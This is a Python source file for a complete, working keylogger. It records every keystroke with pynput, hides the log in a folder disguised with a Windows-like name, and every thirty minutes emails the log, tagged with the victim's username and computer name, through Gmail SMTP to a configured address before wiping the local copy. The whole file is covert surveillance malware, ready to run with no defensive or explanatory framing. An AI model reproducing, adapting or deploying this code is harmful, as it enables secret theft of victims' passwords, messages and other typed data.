from pynput.keyboard import Key, Listener
import logging
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# ---- CONFIG ----------
LOG_BASEPATH = os.path.join(os.path.expanduser("~\\"), "winNTx86_x64")
LOG_FILENAME = os.path.join(LOG_BASEPATH, "log.txt")

# ------ SMTP ----------
SMTP_HOSTNAME = "smtp.gmail.com"
SMTP_USERNAME = "youremail@gmail.com"
SMTP_PASSWORD = "yourpassword"
SMTP_PORT     = "587"

# -------- REPORT ------
EMAIL_SENDER  = SMTP_USERNAME
EMAIL_RECIPIENT = SMTP_USERNAME

# -------- Time related ----------
report_period = 60 * 30
# -------------------------------

last_report = time.time()

line = ""

# create main dir if not available
if not os.path.exists(LOG_BASEPATH):
    os.makedirs(LOG_BASEPATH)

logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# -------------------------------
def sendReport():
    global last_report

    #print("sending report ....\n")

    message = MIMEMultipart()

    message['From'] = EMAIL_SENDER
    message['To'] = EMAIL_RECIPIENT
    message['Subject'] = "Log - " + os.environ["USERNAME"] + " [" + os.environ["COMPUTERNAME"] + "]"

    body = "Please find log in attachment"
    message.attach(MIMEText(body, 'plain'))

    # attach log file to email
    attachment = open(LOG_FILENAME, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename=log.txt")

    message.attach(part)

    attachment.close()

    try:
        smtp_service = smtplib.SMTP(SMTP_HOSTNAME, SMTP_PORT)
        smtp_service.starttls();
        smtp_service.login(SMTP_USERNAME, SMTP_PASSWORD)

        smtp_service.sendmail(EMAIL_SENDER, EMAIL_RECIPIENT, message.as_string())
        smtp_service.quit()
    except smtplib.SMTPException:
        print("SMTPLIB exception")

    # clear file content
    log_handler = open(LOG_FILENAME, "w")
    log_handler.write("")
    log_handler.close()

    last_report = time.time()

# -------------------------------
def beautifyLine(line):
    line = line.replace("[Key.space]", " ")
    line = line.replace("[Key.shift_r]/", "?")

    return line
# -------------------------------

def onKeyPress(key):
    global line
    global last_report
    global report_period

    # log line when Enter is pressed
    if key == Key.enter:
        logging.info(beautifyLine(line))

        # stop if in line is "log.stop"
        if line.find("log.stop") >= 0:
            sendReport()
            #print("STOP")
            return False

        # reset line
        line = ""
    else:
        try:
            line += str(key.char)
        except AttributeError:
            line += "[" + str(key) + "]"

    # send report at certain interval
    if time.time() - last_report >= report_period:
        print("Sending report ...")
        sendReport()
# -------------------------------

with Listener(on_press=onKeyPress) as listener:
    listener.join()
